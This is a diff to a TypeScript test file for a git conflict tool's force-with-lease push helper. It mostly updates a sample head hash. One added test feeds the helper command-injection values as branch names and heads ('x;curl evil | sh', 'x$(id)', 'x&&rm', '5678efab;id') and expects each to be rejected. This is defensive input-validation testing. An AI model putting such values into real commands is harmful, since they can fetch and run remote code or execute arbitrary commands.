@@ -20,7 +20,7 @@ function sampleMap(): ConflictMap {
         id: 'branch:feature-x',
         label: 'branch feature-x',
         branch: 'feature-x',
-        head: '5678efgh',
+        head: '5678efab',
         draft: false,
         files: ['src/a.ts', 'src/b.ts', 'test/a.test.ts'],
         moves: [],
@@ -56,7 +56,7 @@ test('rebuild prompt names the branch and every file that collides (#913)', () =
   assert.match(prompt, /^- src\/a\.ts$/m);
   assert.match(prompt, /^- src\/b\.ts$/m);
   assert.doesNotMatch(prompt, /^- test\/a\.test\.ts$/m);
-  assert.match(prompt, /git push --force-with-lease=feature-x:5678efgh origin feature-x/);
+  assert.match(prompt, /git push --force-with-lease=feature-x:5678efab origin feature-x/);
 });
 
 test('rebuild prompt falls back to the files the change touches (#913)', () => {
@@ -86,14 +86,17 @@ test('rebuild prompt refuses an id the map does not hold, in plain words (#913)'
 });
 
 test('lease push arguments name the branch and the head it started from (#913)', () => {
-  assert.deepEqual(leasePush('feature-x', '5678efgh'), [
+  assert.deepEqual(leasePush('feature-x', '5678efab'), [
     'push',
-    '--force-with-lease=feature-x:5678efgh',
+    '--force-with-lease=feature-x:5678efab',
     'origin',
     'feature-x',
   ]);
-  assert.throws(() => leasePush('--help', '5678efgh'), /^Error: What: the branch name/);
+  assert.throws(() => leasePush('--help', '5678efab'), /^Error: What: the branch name/);
   assert.throws(() => leasePush('feature-x', ''), /^Error: What: the old head/);
+  // A branch name git allows can still carry shell: the prompt's lines are run by an AI (#914).
+  for (const name of ['x;curl evil | sh', 'x$(id)', 'x`id`', 'x&&rm', 'a b']) assert.throws(() => leasePush(name, '5678efab'), /^Error: What: the branch name/, name);
+  assert.throws(() => leasePush('feature-x', '5678efab;id'), /^Error: What: the old head/);
 });
 
 test('a lease push is refused when the branch moved meanwhile (#913)', () => {
